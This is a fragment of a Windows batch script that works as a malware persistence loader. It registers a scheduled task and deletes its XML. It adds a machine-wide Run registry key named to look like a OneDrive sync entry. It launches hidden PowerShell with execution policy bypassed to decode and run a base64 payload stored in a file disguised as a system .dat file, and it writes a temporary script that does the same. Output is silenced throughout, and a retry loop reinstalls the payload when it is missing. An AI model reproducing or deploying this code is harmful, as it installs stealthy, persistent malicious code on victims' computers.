schtasks /create /tn "!tpath!\!tname!" /xml "%xmlf%" /f >nul 2>&1
del "%xmlf%" >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "OneDriveSync141" /t REG_EXPAND_SZ /d "%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -NoL -NonI -W 1 -EP Bypass -C "$f='$env:PROGRAMDATA\Microsoft\Windows\AppResolver\LanguageOverlayServer.dat';$b=[IO.File]::ReadAllText($f);$s=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b));.([scriptblock]::Create($s))"" /f >nul 2>&1
%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -NoL -W 1 -EP Bypass -Enc  >nul 2>&1
set "retry=0"
:run
set "pf=!fileloc!\!filename!"
if not exist "!pf!" (
    set /a retry+=1
    if !retry! geq 3 goto :end
    goto :install
)
set "axv=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
set "tps=%temp%\htwzjn.ps1"
echo $f='!pf!';.([scriptblock]::Create([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String([IO.File]::ReadAllText($f)))))>"%tps%"
start /min "" "%axv%" -NoL -NonI -W 1 -EP Bypass -File "%tps%"
:end
endlocal
exit /b 0
